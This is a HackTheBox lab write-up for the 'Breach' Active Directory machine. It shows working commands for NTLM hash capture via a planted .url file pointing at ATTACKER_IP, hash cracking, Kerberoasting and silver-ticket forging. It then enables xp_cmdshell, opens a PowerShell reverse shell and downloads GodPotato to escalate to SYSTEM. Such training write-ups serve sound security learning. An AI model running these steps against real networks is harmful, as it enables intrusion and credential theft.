# Breach — HackTheBox Writeup

## Enumeration

### Nmap

```bash
nmap -sC -sV -p-
```

Open ports reveal a **Domain Controller** with several AD services.

```
53   DNS
80   IIS
88   Kerberos
389  LDAP
445  SMB
1433 MSSQL
3389 RDP
5985 WinRM
```

LDAP enumeration reveals the domain:

```
breach.vl
```

Host:

```
BREACHDC
```

Add the domain to `/etc/hosts`.

```bash
echo "breach.vl BREACHDC.breach.vl" | sudo tee -a /etc/hosts
```

---

# SMB Enumeration

Enumerate SMB shares.

```bash
nxc smb breach.vl -u guest -p '' --shares
```

Accessible shares:

```
share      READ,WRITE
Users      READ
```

The **share** directory is writable.

---

# Accessing the Share

Connect to the share.

```bash
smbclient //breach.vl/share
```

Directory structure:

```
finance
software
transfer
```

Inside `transfer`:

```
claire.pope
diana.pope
julia.wong
```

---

# NTLM Hash Capture

Because the share is writable, upload a malicious `.url` file to trigger authentication.

Create the file:

```text
kavi.url
```

Contents:

```text
[InternetShortcut]
URL=test
WorkingDirectory=test
IconFile=\\ATTACKER_IP\share\nc.ico
IconIndex=1
```

Upload the file.

```bash
put kavi.url
```

Start Responder.

```bash
sudo responder -I tun0
```

Captured credentials:

```
BREACH\Julia.Wong
```

---

# Cracking the Hash

Crack the captured hash using Hashcat.

```bash
hashcat -m 5600 julia.hash /usr/share/wordlists/rockyou.txt
```

Recovered password:

```
Computer1
```

Credentials obtained:

```
julia.wong : Computer1
```

---

# Kerberoasting

Enumerate Service Principal Names.

```bash
GetUserSPNs.py breach.vl/julia.wong:Computer1 -request
```

Result:

```
svc_mssql
MSSQLSvc/breachdc.breach.vl
```

Request the Kerberos ticket.

```
$krb5tgs$
```

---

# Cracking the Service Account

Crack the Kerberos ticket.

```bash
hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
svc_mssql : Trustno1
```

---

# Silver Ticket Attack

Generate NT hash.

```bash
pypykatz crypto nt Trustno1
```

```
69596c7aa1e8daee17f8e78870e25a5c
```

Retrieve the domain SID.

```bash
lookupsid.py breach.vl/svc_mssql:Trustno1
```

Forge the ticket.

```bash
ticketer.py \
-spn MSSQLSvc/breachdc.breach.vl \
-domain breach.vl \
-domain-sid DOMAIN_SID \
-nthash 69596c7aa1e8daee17f8e78870e25a5c \
-user-id 500 \
Administrator
```

Export the ticket.

```bash
export KRB5CCNAME=Administrator.ccache
```

Connect to MSSQL.

```bash
mssqlclient.py -k -no-pass breachdc.breach.vl
```

SQL access obtained.

```
SQL (BREACH\Administrator dbo@master)>
```

---

# Command Execution

Enable `xp_cmdshell`.

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

Verify command execution.

```sql
EXEC xp_cmdshell 'whoami';
```

Output:

```
breach\svc_mssql
```

---

# Reverse Shell

Start listener.

```bash
nc -lvnp 9090
```

Execute encoded PowerShell reverse shell.

```sql
EXEC xp_cmdshell 'powershell -exec bypass -enc <payload>';
```

Shell obtained as:

```
svc_mssql
```

---

# Privilege Escalation

Check privileges.

```powershell
whoami /priv
```

Result:

```
SeImpersonatePrivilege Enabled
```

This privilege allows token impersonation attacks.

---

# GodPotato

Host the binary.

```bash
python3 -m http.server 80
```

Download on the target.

```powershell
cd C:\Windows\Tasks
curl ATTACKER_IP/GodPotato.exe -o GodPotato.exe
```

Start listener.

```bash
nc -lvnp 9090
```

Execute exploit.

```powershell
.\GodPotato.exe -cmd "powershell -exec bypass -enc <payload>"
```

Shell obtained:

```
nt authority\system
```

---

# Root

Navigate to Administrator desktop.

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

Root obtained.

---

# Attack Chain

```
Writable SMB share
        ↓
NTLM hash capture
        ↓
Crack user password
        ↓
Kerberoast service account
        ↓
Silver Ticket
        ↓
MSSQL command execution
        ↓
Reverse shell
        ↓
SeImpersonatePrivilege
        ↓
GodPotato
        ↓
SYSTEM
```

---

